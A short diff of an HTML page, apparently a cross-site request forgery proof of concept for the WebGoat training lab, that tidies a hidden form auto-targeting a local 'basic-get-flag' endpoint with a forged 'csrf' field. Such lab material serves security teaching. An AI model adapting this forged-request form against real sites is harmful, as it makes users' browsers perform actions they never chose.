@@ -6,15 +6,11 @@
   </head>
   <body>
     <form
-      accept-charset="UNKNOWN"
-      id="basic-csrf-get"
-      method="POST"
-      name="form1"
-      target="_blank"
-      successcallback=""
+      method="post"
       action="http://localhost:8080/WebGoat/csrf/basic-get-flag"
+      target="_blank"
     >
-      <input name="csrf" type="hidden" value="false" />
+      <input type="hidden" name="csrf" value="false" />
       <input type="submit" name="submit" />
     </form>
   </body>
